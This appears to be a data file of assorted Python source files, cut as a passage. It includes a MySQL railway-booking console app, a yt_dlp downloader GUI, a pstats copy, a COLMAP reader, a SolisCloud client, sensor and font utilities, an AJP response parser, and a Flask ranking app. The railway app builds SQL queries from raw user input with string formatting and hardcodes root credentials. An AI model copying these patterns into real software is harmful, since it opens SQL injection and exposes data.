YOU ARE NOT A ROBOT :\",r1,\"+\",r2)\n        user_ans=int(input(\"enter your ans\"))\n        if user_ans==r1+r2:\n            try:\n                mycur=mydb.cursor()\n                sql=\"insert into details values('{}','{}','{}')\".format(usename,password,phone)\n                mycur.execute(sql)\n                mydb.commit()\n                print(\"ACCOUNT CREATED SUCESSFULLY...\\n\")\n                log_sign()\n            except:\n                print(\"PHONE NUMBER ALREADY EXIST :\")\n                insert()\n        else:\n            print(\"\u274e\"*10,\"WRONG OUTPUT\",\"\u274e\"*10)\n            insert()      \n#-----------------------------------------------LOGIN-------------------------------------------------------------\ndef login():\n    global ph\n    global pas\n    print(\"\u2705\"*25,\"LOGIN\",\"\u2705\"*25)\n    ph=input(\"ENTER YOUR PHONE NUMBER :\")\n    pas=input(\"ENTER PASSWORD :\")\n    mycur.execute(\"use railway\")\n    a=\"select * from details where phone='{}' and pass='{}'\".format(ph,pas)\n    mycur.execute(a)\n    rec=mycur.fetchall()\n    if  rec==[]:\n        print(\"DATA  NOT  FOUND\")\n        log_sign()\n        \n    else:\n        print(\"LOGIN  SUCCESSFULLY\")\n        print(\" HEY \",rec[0][0])\n        main()\n        return True\n#-------------------------------------------------DELETE-------------------------------------------------------\ndef delete():\n    mydb=mycon.connect(host=\"localhost\",user=\"root\",password=\"1234\")\n    mycur=mydb.cursor()\n    print(\"\u274e\"*15,\"DELETE  YOUR  ACCOUNT\",\"\u274e\"*15)\n    ph=input(\"ENTER YOUR PHONE NUMBER\")\n    pas=input(\"ENTER PASSWORD : \")\n    mycur.execute(\"use railway\")\n    mycur.execute(\"select phone,pass from details where phone='{}' and pass='{}'\".format(ph,pas))\n    rec=mycur.fetchall()\n    for x in rec:\n        if x[0]==ph and x[1]==pas:\n            mycur.execute(\"delete from details where phone='{}' and pass='{}'\".format(ph,pas))\n            mydb.commit()\n            print(\"YOUR  ACCOUNT  DELETED  SUCCESSFULLY \")\n            log_sign()\n        else:\n            print(\"DATA NOT FOUND\")\n            log_sign()\n#--------------------------------------------EXIT-----------------------------------------------------------\ndef ex():\n    exit()\n#----------------------------------------\ndef c_tdetails():\n    mydb=mycon.connect(host=\"localhost\",user=\"root\",password=\"1234\")\n    mycur=mydb.cursor()\n    mycur.execute(\"use railway \")\n    mycur.execute(\"create table if not exists tdetails(train_no char(5) not null ,\\\ntname varchar(50) not null ,sfrom varchar(25) not null,sto varchar(25) not null ,\\\nday varchar(50) not null,time float(10) not null)\")\nc_tdetails() ",
    "def find_ancestors(node, grg):\n    # this function recursively collects all ancestors of a given node\n    ancestors = []\n    parents = grg.get_up_edges(node)\n    for parent in parents:\n        ancestors.append(parent)\n        ancestors.extend(find_ancestors(parent, grg))\n    return ancestors\n\n\ndef test_individual_sample(sample, grg, causal_mutation_df):\n    ancestors = find_ancestors(sample, grg)\n\n    mutation_effect_sizes = {\n        int(row[\"mutation_id\"]): float(row[\"effect_size\"])\n        for index, row in causal_mutation_df.iterrows()\n    }\n\n    # initialize a dictionary to store the cumulative effect sizes for each node\n    node_effect_sizes = {node: 0.0 for node in range(grg.num_nodes)}\n\n    # compute initial effect sizes for each node by summing mutations' effect sizes\n    for node in node_effect_sizes.keys():\n        mutations = grg.get_mutations_for_node(node)\n        if mutations:\n            total_effect_size = sum(\n                mutation_effect_sizes.get(mutation, 0) for mutation in mutations\n            )\n            node_effect_sizes[node] = total_effect_size\n\n    for node in node_effect_sizes.keys():\n        if node in ancestors:\n            node_effect_sizes[sample] += node_effect_sizes[node]\n\n    return node_effect_sizes[sample]\n\n\ndef test_additive_effect_sizes(grg, causal_mutation_df):\n    sample_nodes = grg.get_sample_nodes()\n    sample_effect_sizes = []\n\n    for sample in sample_nodes:\n        sample_effect_size = test_individual_sample(sample, grg, causal_mutation_df)\n        sample_effect_sizes.append(sample_effect_size)\n\n    return sample_effect_sizes\n",
    "import tkinter\nfrom calendar import error\nfrom ctypes import windll, byref, sizeof, c_int\nimport ctypes\nimport threading\nimport tkinter as tk\nimport webbrowser\nfrom ftplib import all_errors\nfrom pathlib import Path\nimport yt_dlp\nimport subprocess\nimport platform\nfrom tkinter.ttk import *\nfrom tkinter import *\nfrom tkinter import ttk\nfrom tkinter import filedialog as fd\nfrom tkinter import font\n\n#Increase quality of text\nctypes.windll.shcore.SetProcessDpiAwareness(1)\n\n#Opening download folder\ndef OpenFolder():\n    open_path = \"explorer\" + \" \" + save_path + \"\\\\Youtube Downloader\"\n    subprocess.Popen(open_path)\n\n#Selfpromo\ndef OpenLink():\n    webbrowser.open(\"https://github.com/no-t1me\")\n\n#Rightclick paste menu\nclass Rightclick:\n    def __init__(self, e):\n        command = \"Paste\"\n        menu = tk.Menu(None, tearoff=0, takefocus=0)\n\n        menu.add_command(label=command, command=lambda e=e, command=command:self.ClickCommand(e, command))\n\n        menu.tk_popup(e.x_root + 40, e.y_root + 10, entry=\"0\")\n\n    @staticmethod\n    def ClickCommand(e, cmd):\n        e.widget.event_generate(f'<<{cmd}>>')\n\n#Hiding and showing buttons to stop the impostor\ndef HideButtons():\n    button.config(state=\"disabled\")\n    download_from_file.config(state=\"disabled\")\n\ndef ShowButtons():\n    button.config(state=\"normal\")\n    download_from_file.config(state=\"normal\")\n\ndef ResetLabels():\n    status_label.configure(text=\"\")\n    status_label2.configure(text=\"\")\n\ndef OpenErrors():\n    error_popup = Toplevel(root)\n    error_popup.configure(bg=\"#292929\")\n    error_popup.geometry(\"1400x600\")\n    error_popup.title(\"List of errors\")\n    scrollbar = Scrollbar(error_popup)\n    error_text = Listbox(error_popup,\n                      yscrollcommand = scrollbar.set,\n                      justify=\"left\",\n                      bg=\"#292929\",\n                      fg=\"red\",\n                      height=200,\n                      width=600,\n                      selectmode=tk.EXTENDED,\n                     )\n    for i in all_errors:\n        error_text.insert(END, i)\n    scrollbar.pack(side=RIGHT,\n                   fill=Y\n                   )\n    scrollbar.config(command=error_text.yview)\n    error_text.pack()\n    WindowCenter(error_popup)\n\ndef SetEndLabel(is_single_link):\n    global correct_download_count\n    global number_of_links\n    status_label.config(text=\"Cleaning! Almost done.\", fg=\"#0027cf\")\n    if is_single_link:\n            link_entry.delete(0, END)\n            status_label.config(text=\"Download and convertion successful!\", fg=\"#00c200\")\n            progress.stop()\n            ShowButtons()\n    else:\n        link_entry.delete(0, END)\n        status_label.config(text=f\"Download and convertion successful for {correct_download_count} out of {number_of_links} links!\", fg=\"#00c200\")\n        progress.stop()\n        if correct_download_count != number_of_links:\n\n            f = font.Font(status_label2, status_label2.cget(\"font\"))\n            f.configure(underline=True)\n            status_label2.configure(text=\"Some links were skipped due to errors\", fg=\"red\", font=f, cursor= \"hand2\")\n            status_label2.bind(\"<Button-1>\", lambda e:OpenErrors())\n        ShowButtons()\n\nclass Logger(object):\n    def debug(self, msg):\n        global number_of_links\n        global correct_download_count\n        end_message = \"[ExtractAudio]\"\n        if end_message in msg:\n            correct_download_count = correct_download_count + 1\n            status_label2.configure(text=f\"Done downloading {correct_download_count}/{number_of_links}\", fg=\"#0027c2\")\n\n    def warning(self, msg):\n        print(msg)\n\n    def error(self, msg):\n        global correct_download_count\n        msg = msg + \" | Index number of bad url: #\" + str(correct_download_count + 1)\n        all_errors.append(msg)\n\n\ndef Download(single_link, file_name, ydl_opts):\n    progress.start()\n    status_label.config(text=\"\", fg=\"black\")\n    if file_name != \"\":\n        # global single_downloads\n        # single_downloads = 0\n        is_single_link = False\n        with open(file_name, 'r') as file:\n            links = [line.strip() for line in file]\n            while '' in links:\n                links.remove('')\n            with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n                ydl.download(links)\n            return SetEndLabel(is_single_link)\n    else:\n        is_single_link = True\n        try:\n            with yt_dlp.YoutubeDL(ydl_opts) as ydl:\n                ydl.download([single_link])\n            return SetEndLabel(is_single_link)\n        except:\n            progress.stop()\n            ShowButtons()\n            status_label.configure(fg=\"red\", text=\"Invalid link! Try again or use different url.\")\n            return\n\n# Function starting thread to stop program from freezing\ndef StartThread(single_link, file_name, ydl_opts):\n    thread = threading.Thread(target=Download, args=[single_link, file_name, ydl_opts])\n    thread.start()\n\ndef SetOptions(is_single_link):\n    if is_single_link:\n        ydl_opts = {\n   ",
    "\"\"\"Class for printing reports on profiled python code.\"\"\"\n\n# Written by James Roskind\n# Based on prior profile module by Sjoerd Mullender...\n#   which was hacked somewhat by: Guido van Rossum\n\n# Copyright Disney Enterprises, Inc.  All Rights Reserved.\n# Licensed to PSF under a Contributor Agreement\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,\n# either express or implied.  See the License for the specific language\n# governing permissions and limitations under the License.\n\n\nimport sys\nimport os\nimport time\nimport marshal\nimport re\n\nfrom enum import StrEnum, _simple_enum\nfrom functools import cmp_to_key\nfrom dataclasses import dataclass\nfrom typing import Dict\n\n__all__ = [\"Stats\", \"SortKey\", \"FunctionProfile\", \"StatsProfile\"]\n\n@_simple_enum(StrEnum)\nclass SortKey:\n    CALLS = 'calls', 'ncalls'\n    CUMULATIVE = 'cumulative', 'cumtime'\n    FILENAME = 'filename', 'module'\n    LINE = 'line'\n    NAME = 'name'\n    NFL = 'nfl'\n    PCALLS = 'pcalls'\n    STDNAME = 'stdname'\n    TIME = 'time', 'tottime'\n\n    def __new__(cls, *values):\n        value = values[0]\n        obj = str.__new__(cls, value)\n        obj._value_ = value\n        for other_value in values[1:]:\n            cls._value2member_map_[other_value] = obj\n        obj._all_values = values\n        return obj\n\n\n@dataclass(unsafe_hash=True)\nclass FunctionProfile:\n    ncalls: str\n    tottime: float\n    percall_tottime: float\n    cumtime: float\n    percall_cumtime: float\n    file_name: str\n    line_number: int\n\n@dataclass(unsafe_hash=True)\nclass StatsProfile:\n    '''Class for keeping track of an item in inventory.'''\n    total_tt: float\n    func_profiles: Dict[str, FunctionProfile]\n\nclass Stats:\n    \"\"\"This class is used for creating reports from data generated by the\n    Profile class.  It is a \"friend\" of that class, and imports data either\n    by direct access to members of Profile class, or by reading in a dictionary\n    that was emitted (via marshal) from the Profile class.\n\n    The big change from the previous Profiler (in terms of raw functionality)\n    is that an \"add()\" method has been provided to combine Stats from\n    several distinct profile runs.  Both the constructor and the add()\n    method now take arbitrarily many file names as arguments.\n\n    All the print methods now take an argument that indicates how many lines\n    to print.  If the arg is a floating-point number between 0 and 1.0, then\n    it is taken as a decimal percentage of the available lines to be printed\n    (e.g., .1 means print 10% of all available lines).  If it is an integer,\n    it is taken to mean the number of lines of data that you wish to have\n    printed.\n\n    The sort_stats() method now processes some additional options (i.e., in\n    addition to the old -1, 0, 1, or 2 that are respectively interpreted as\n    'stdname', 'calls', 'time', and 'cumulative').  It takes either an\n    arbitrary number of quoted strings or SortKey enum to select the sort\n    order.\n\n    For example sort_stats('time', 'name') or sort_stats(SortKey.TIME,\n    SortKey.NAME) sorts on the major key of 'internal function time', and on\n    the minor key of 'the name of the function'.  Look at the two tables in\n    sort_stats() and get_sort_arg_defs(self) for more examples.\n\n    All methods return self, so you can string together commands like:\n        Stats('foo', 'goo').strip_dirs().sort_stats('calls').\\\n                            print_stats(5).print_callers(5)\n    \"\"\"\n\n    def __init__(self, *args, stream=None):\n        self.stream = stream or sys.stdout\n        if not len(args):\n            arg = None\n        else:\n            arg = args[0]\n            args = args[1:]\n        self.init(arg)\n        self.add(*args)\n\n    def init(self, arg):\n        self.all_callees = None  # calc only if needed\n        self.files = []\n        self.fcn_list = None\n        self.total_tt = 0\n        self.total_calls = 0\n        self.prim_calls = 0\n        self.max_name_len = 0\n        self.top_level = set()\n        self.stats = {}\n        self.sort_arg_dict = {}\n        self.load_stats(arg)\n        try:\n            self.get_top_level_stats()\n        except Exception:\n            print(\"Invalid timing data %s\" %\n                  (self.files[-1] if self.files else ''), file=self.stream)\n            raise\n\n    def load_stats(self, arg):\n        if arg is None:\n            self.stats = {}\n            return\n        elif isinstance(arg, str):\n            with open(arg, 'rb') as f:\n                self.stats = marshal.load(f)\n            try:\n                file_stats = os.stat(arg)\n                arg = time.ctime(file_stats.st_mtime) + \"    \" + arg\n            exce",
    "# Copyright (c) 2023, ETH Zurich and UNC Chapel Hill.\n# All rights reserved.\n#\n# Redistribution and use in source and binary forms, with or without\n# modification, are permitted provided that the following conditions are met:\n#\n#     * Redistributions of source code must retain the above copyright\n#       notice, this list of conditions and the following disclaimer.\n#\n#     * Redistributions in binary form must reproduce the above copyright\n#       notice, this list of conditions and the following disclaimer in the\n#       documentation and/or other materials provided with the distribution.\n#\n#     * Neither the name of ETH Zurich and UNC Chapel Hill nor the names of\n#       its contributors may be used to endorse or promote products derived\n#       from this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS OR CONTRIBUTORS BE\n# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n\n\nimport os\nimport collections\nimport numpy as np\nimport struct\nimport argparse\n\n\nCameraModel = collections.namedtuple(\n    \"CameraModel\", [\"model_id\", \"model_name\", \"num_params\"]\n)\nCamera = collections.namedtuple(\n    \"Camera\", [\"id\", \"model\", \"width\", \"height\", \"params\"]\n)\nBaseImage = collections.namedtuple(\n    \"Image\", [\"id\", \"qvec\", \"tvec\", \"camera_id\", \"name\", \"xys\", \"point3D_ids\"]\n)\nPoint3D = collections.namedtuple(\n    \"Point3D\", [\"id\", \"xyz\", \"rgb\", \"error\", \"image_ids\", \"point2D_idxs\"]\n)\n\n\nclass Image(BaseImage):\n    def qvec2rotmat(self):\n        return qvec2rotmat(self.qvec)\n\n\nCAMERA_MODELS = {\n    CameraModel(model_id=0, model_name=\"SIMPLE_PINHOLE\", num_params=3),\n    CameraModel(model_id=1, model_name=\"PINHOLE\", num_params=4),\n    CameraModel(model_id=2, model_name=\"SIMPLE_RADIAL\", num_params=4),\n    CameraModel(model_id=3, model_name=\"RADIAL\", num_params=5),\n    CameraModel(model_id=4, model_name=\"OPENCV\", num_params=8),\n    CameraModel(model_id=5, model_name=\"OPENCV_FISHEYE\", num_params=8),\n    CameraModel(model_id=6, model_name=\"FULL_OPENCV\", num_params=12),\n    CameraModel(model_id=7, model_name=\"FOV\", num_params=5),\n    CameraModel(model_id=8, model_name=\"SIMPLE_RADIAL_FISHEYE\", num_params=4),\n    CameraModel(model_id=9, model_name=\"RADIAL_FISHEYE\", num_params=5),\n    CameraModel(model_id=10, model_name=\"THIN_PRISM_FISHEYE\", num_params=12),\n}\nCAMERA_MODEL_IDS = dict(\n    [(camera_model.model_id, camera_model) for camera_model in CAMERA_MODELS]\n)\nCAMERA_MODEL_NAMES = dict(\n    [(camera_model.model_name, camera_model) for camera_model in CAMERA_MODELS]\n)\n\n\ndef read_next_bytes(fid, num_bytes, format_char_sequence, endian_character=\"<\"):\n    \"\"\"Read and unpack the next bytes from a binary file.\n    :param fid:\n    :param num_bytes: Sum of combination of {2, 4, 8}, e.g. 2, 6, 16, 30, etc.\n    :param format_char_sequence: List of {c, e, f, d, h, H, i, I, l, L, q, Q}.\n    :param endian_character: Any of {@, =, <, >, !}\n    :return: Tuple of read and unpacked values.\n    \"\"\"\n    data = fid.read(num_bytes)\n    return struct.unpack(endian_character + format_char_sequence, data)\n\n\ndef write_next_bytes(fid, data, format_char_sequence, endian_character=\"<\"):\n    \"\"\"pack and write to a binary file.\n    :param fid:\n    :param data: data to send, if multiple elements are sent at the same time,\n    they should be encapsuled either in a list or a tuple\n    :param format_char_sequence: List of {c, e, f, d, h, H, i, I, l, L, q, Q}.\n    should be the same length as the data list or tuple\n    :param endian_character: Any of {@, =, <, >, !}\n    \"\"\"\n    if isinstance(data, (list, tuple)):\n        bytes = struct.pack(endian_character + format_char_sequence, *data)\n    else:\n        bytes = struct.pack(endian_character + format_char_sequence, data)\n    fid.write(bytes)\n\n\ndef read_cameras_text(path):\n    \"\"\"\n    see: src/colmap/scene/reconstruction.cc\n        void Reconstruction::WriteCamerasText(const std::string& path)\n        void Reconstruction::ReadCamerasText(const std::string& path)\n    \"\"\"\n    cameras = {}\n    with open(path, \"r\") as fid:\n        while True:\n            line = fid.readline()\n            if not line:\n                break\n            line = line.strip()\n            if len(line) > 0 and line[0] != \"#\":\n                elems = line.split()\n                camera_id = int(elems[0])\n                model = elems[1]\n        ",
    "#!/usr/bin/env python3\n#\n# Library to interface with Soliscloud's control api\n# This allows charging and discharging to be triggered\n# and charge rates to be amended\n#\n# Copyright (c) 2025, B Tasker\n# Released under BSD 3-Clause License\n#\n\n'''\nCopyright (c) 2023, B Tasker\n\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, are\npermitted provided that the following conditions are met:\n\n1. Redistributions of source code must retain the above copyright notice, this list of\nconditions and the following disclaimer.\n\n2. Redistributions in binary form must reproduce the above copyright notice, this list of\nconditions and the following disclaimer in the documentation and/or other materials\nprovided with the distribution.\n\n3. Neither the name of the copyright holder nor the names of its contributors may be used\nto endorse or promote products derived from this software without specific prior written\npermission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\nEXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\nCOPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\nEXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)\nHOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR\nTORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n'''\n\nimport datetime\nimport base64\nimport hashlib\nimport hmac\nimport json\nimport os\nimport re\nimport requests\nimport sys\nimport time\n\n\nclass SolisCloud:\n\n    def __init__(self, config, session=False, debug=False):\n        self.config = config\n        self.debug = debug\n        if session:\n            self.session = session\n        else:\n            self.session = requests.session()\n\n        # Tracking information for rate limit observance\n        self.ratelimit = {\n            \"requests\" : 0,\n            \"lastreset\" : time.time()\n            }\n\n    def checkRateLimit(self):\n        ''' Check how many requests we've made and when\n        in order to assess whether we're at risk of hitting\n        service rate limits.\n        \n        The API doc says:\n        \n            Note: The calling frequency of all interfaces is limited to three times every five seconds for the same IP\n        \n        It does not clarify whether we'll get a HTTP 429 or some other status\n        '''\n        \n        # What we want to check is\n        #\n        # Was the last reset more than 5 seconds ago\n        # Have there been >= 3 requests?\n        #\n        now = time.time()\n        # When was the last quota reset?\n        if (now - self.ratelimit['lastreset']) >= 1:\n            self.printDebug(f'RATE_LIMIT_CHECK: Last reset was more than 1 seconds ago')\n            # Should be fine, reset the limit\n            self.ratelimit['lastreset'] = now\n            self.ratelimit['requests'] = 1\n            return True\n        \n        # If we reached this point, we're within the n second boundary\n        # check how many requests have been placed\n        if (self.ratelimit['requests'] + 1) > self.config['api_rate_limit']:\n            self.printDebug(f'RATE_LIMIT_CHECK: Breach - too many requests')\n            # We'd be breaching the rate limit\n            #\n            # We don't increment the counter because we're\n            # preventing the request from being sent yet\n            return False\n        \n        # So we're within the time bounds but haven't yet hit the maximum number of\n        # requests. Increment the counter and approve the request\n        self.printDebug(f'RATE_LIMIT_CHECK: Request approved')\n        self.ratelimit['requests'] += 1\n        return True\n\n    def createHMAC(self, signstr, secret, algo):\n        ''' Create a HMAC of signstr using secret and algo\n        \n        https://snippets.bentasker.co.uk/page-1910021144-Generate-HMACs-with-different-algorithms-Python3.html\n        '''\n        hashedver = hmac.new(secret.encode('utf-8'),signstr.encode('utf-8'),algo)\n        return hashedver.digest()\n\n\n    def doAuth(self, key_id, secret, req_path, req_body, method=\"POST\", content_type=\"application/json\", datestring=False):\n        ''' Calculate an authorization header value to accompany the request\n        \n        Solis' API docs describe the method as:\n        \n            Authorization = \"API \" + KeyId + \":\" + Sign\n            Sign = base64(HmacSHA1(KeySecret,\n            VERB + \"\\n\"\n            + Content-MD5 + \"\\n\"\n            + Content-Type + \"\\n\"\n            + Date + \"\\n\"\n            + CanonicalizedResource))\n            \n            \n        Note: the API wants MD5s and SHA1s to be digests and not hexdigests\n        ",
    "import smbus2\n\n\nclass InfraredSensors:\n    \"\"\"\n    A class to interface with infrared sensors over I2C.\n\n    The sensors can be used to detect obstacles or follow lines by reading the\n    sensor data, which returns a list of boolean values for each sensor state.\n    \"\"\"\n\n    def __init__(self, address=0x78, bus=1):\n        \"\"\"\n        Initializes the InfraredSensors class.\n\n        :param address: I2C address of the sensor (default 0x78). Use `scan_i2c_bus()` to check your address.\n        :param bus: I2C bus number (default 1). This is the most common bus on modern boards such as Raspberry Pi,\n                    usually connected to the SCL (Clock) and SDA (Data) pins.\n        \"\"\"\n        self.address = address\n        self.bus = smbus2.SMBus(bus)\n\n    def scan_i2c_bus(self):\n        \"\"\"\n        Scans the I2C bus for available devices and prints their addresses.\n\n        This method can be used to confirm the I2C address of the sensor.\n        \"\"\"\n        try:\n            devices = []\n            for address in range(0, 128):\n                try:\n                    self.bus.read_byte(address)\n                    devices.append(hex(address))\n                except IOError:\n                    pass\n            print(f\"Found devices at: {', '.join(devices)}\")\n            return devices\n        except Exception as e:\n            print(f\"Error scanning I2C bus: {e}\")\n            return []\n\n    def read_sensor_data(self, register=0x01):\n        \"\"\"\n        Reads data from the sensor and returns the sensor states as booleans.\n\n        :param register: The register address to read from (default 0x01).\n        :return: List of booleans representing the state of each sensor.\n        \"\"\"\n        try:\n            value = self.bus.read_byte_data(self.address, register)\n            # Dynamically calculate the bit masks for the sensor states\n            return [(value & (1 << i)) > 0 for i in range(4)]  # Assumes 4 sensors\n        except Exception as e:\n            print(f\"Error reading sensor data: {e}\")\n            return [False] * 4\n\n\n# Example usage:\n# sensors = InfraredSensors()\n# sensors.scan_i2c_bus()  # Scan and print available I2C devices\n# sensor_data = sensors.read_sensor_data()  # Read sensor data\n# print(sensor_data)\n",
    "import json\nimport subprocess\nimport argparse\nimport os\nimport sys\n\ndef main():\n    # Parse command-line arguments\n    parser = argparse.ArgumentParser(description='Generate font files from glyph data.')\n    parser.add_argument(\"--json-file\", required=True, help=\"Path to the JSON file containing glyph data.\")\n    parser.add_argument(\"--bbp\", type=int, required=True, help=\"Bits per pixel for the font.\")\n    parser.add_argument(\"--font-name\", required=True, help=\"Name of the font.\")\n    parser.add_argument(\"--font-sizes\", type=int, required=True, nargs='+', help=\"List of font sizes to generate.\")\n    args = parser.parse_args()\n\n    # Check if JSON file exists\n    if not os.path.isfile(args.json_file):\n        print(f\"Error: JSON file '{args.json_file}' not found.\")\n        sys.exit(1)\n\n    # Read and parse the JSON file\n    with open(args.json_file, 'r', encoding='utf-8') as f:\n        try:\n            data = json.load(f)\n        except json.JSONDecodeError as e:\n            print(f\"Error parsing JSON file: {e}\")\n            sys.exit(1)\n\n    # Extract and process unicode values\n    try:\n        unicode_strings = [glyph['unicode'] for glyph in data['glyphs']]\n    except KeyError:\n        print(\"Error: JSON data does not contain 'glyphs' key or 'unicode' values.\")\n        sys.exit(1)\n\n    # Convert unicode strings to decimal integers\n    code_points = []\n    for u in unicode_strings:\n        code_points.append(\"0x\"+u)\n\n    # Determine the minimum and maximum code points\n    if not code_points:\n        print(\"No valid code points found.\")\n        sys.exit(1)\n\n\n    # Format the RANGE string\n    RANGE = ','.join(code_points)\n    print(f\"RANGE: {RANGE}\")\n\n    # Loop through each font size and generate the font files\n    for font_size in args.font_sizes:\n        # Construct the command\n        command = [\n            \"lv_font_conv\",\n            f\"--font {args.font_name}.ttf\",\n            f\"-r {RANGE}\",\n            \"--no-compress\",\n            f\"--size {font_size}\",\n            \"--format lvgl\",\n            f\"--bpp {args.bbp}\",\n            f\"-o {args.font_name}_{font_size}.c\"\n        ]\n        command_str = \" \".join(command)\n        \n        # Execute the command\n        try:\n            subprocess.run(command_str, shell=True, check=True)\n        except subprocess.CalledProcessError as e:\n            print(f\"Error executing command: {e}\")\n            continue\n        \n        # Print the font declaration\n        print(f\"LV_FONT_DECLARE({args.font_name}_{font_size})\")\n\nif __name__ == \"__main__\":\n    main()",
    "# -*- coding: utf-8 -*-\n# @Time    : 13 1\u6708 2025 11:56\u202f\u4e0b\u5348\n# @Author  : codervibe\n# @File    : AjpResponse.py\n# @Project : TomcatScan\n\nfrom . import AjpResponse\nfrom common.common import unpack, unpack_string\n\n\nclass AjpResponse:\n    \"\"\"\n    AJP \u54cd\u5e94\u7c7b\u3002\n    \"\"\"\n    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)\n    COMMON_SEND_HEADERS = [\n        \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\",\n        \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\"\n    ]\n\n    def parse(self, stream):\n        \"\"\"\n        \u89e3\u6790\u54cd\u5e94\u6570\u636e\u3002\n\n        \u53c2\u6570:\n            stream: \u6570\u636e\u6d41\u5bf9\u8c61\n        \"\"\"\n        self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\")\n\n        if self.prefix_code == AjpResponse.SEND_HEADERS:\n            self.parse_send_headers(stream)\n        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:\n            self.parse_send_body_chunk(stream)\n        elif self.prefix_code == AjpResponse.END_RESPONSE:\n            self.parse_end_response(stream)\n        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:\n            self.parse_get_body_chunk(stream)\n        else:\n            raise NotImplementedError\n\n    def parse_send_headers(self, stream):\n        \"\"\"\n        \u89e3\u6790\u53d1\u9001\u7684\u54cd\u5e94\u5934\u3002\n        \"\"\"\n        self.http_status_code, = unpack(stream, \">H\")\n        self.http_status_msg = unpack_string(stream)\n        self.num_headers, = unpack(stream, \">H\")\n        self.response_headers = {}\n        for i in range(self.num_headers):\n            code, = unpack(stream, \">H\")\n            if code <= 0xA000:  # custom header\n                h_name, = unpack(stream, \"%ds\" % code)\n                stream.read(1)  # \\0\n                h_value = unpack_string(stream)\n            else:\n                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]\n                h_value = unpack_string(stream)\n            self.response_headers[h_name] = h_value\n\n    def parse_send_body_chunk(self, stream):\n        \"\"\"\n        \u89e3\u6790\u53d1\u9001\u7684\u54cd\u5e94\u4f53\u5757\u3002\n        \"\"\"\n        self.data_length, = unpack(stream, \">H\")\n        self.data = stream.read(self.data_length + 1)\n\n    def parse_end_response(self, stream):\n        \"\"\"\n        \u89e3\u6790\u7ed3\u675f\u54cd\u5e94\u3002\n        \"\"\"\n        self.reuse, = unpack(stream, \"b\")\n\n    def parse_get_body_chunk(self, stream):\n        \"\"\"\n        \u89e3\u6790\u83b7\u53d6\u7684\u54cd\u5e94\u4f53\u5757\u3002\n        \"\"\"\n        rlen, = unpack(stream, \">H\")\n        return rlen\n\n    @staticmethod\n    def receive(stream):\n        \"\"\"\n        \u63a5\u6536\u5e76\u89e3\u6790\u6570\u636e\u3002\n\n        \u53c2\u6570:\n            stream: \u6570\u636e\u6d41\u5bf9\u8c61\n        \u8fd4\u56de:\n            AjpResponse: \u89e3\u6790\u540e\u7684\u54cd\u5e94\u5bf9\u8c61\n        \"\"\"\n        r = AjpResponse()\n        r.parse(stream)\n        return r\n",
    "#Imports----------------------------------------------------------------------------------------------------------------\nfrom flask import Flask, render_template, request\n\nimport requests\nfrom bs4 import BeautifulSoup\n\ntry:\n    from googlesearch import search\nexcept ImportError:\n    pass\n    #print(\"No module named 'google' found\")\n\nfrom prettytable import PrettyTable\n#import os\n#import time\nimport random\n\n#-----------------------------------------------------------------------------------------------------------------------\n#Bugs 12/31 v\n#If '...' appears below the confirm button on the results page, there was an error in processing the input string\n#Intended Major appearing when not selected\n\n\n#Global Variables-------------------------------------------------------------------------------------------------------\nnewrankList = []\nfinalList = []\nfinalListCollegesOnlyP = []\nfinalListCollegesOnlyC = []\nreportfinalListP = []\nreportfinalListC = []\ncustomList = []\nfullListP = []\nfullListC = []\ntfullListC = []\nspecificsList = []\npreattList = []\n\naImportance = 0\nnumPcalls = 0\nnumCcalls = 0\nTICKER = 0\n\nbaseList = [25, 24, 23, 22, 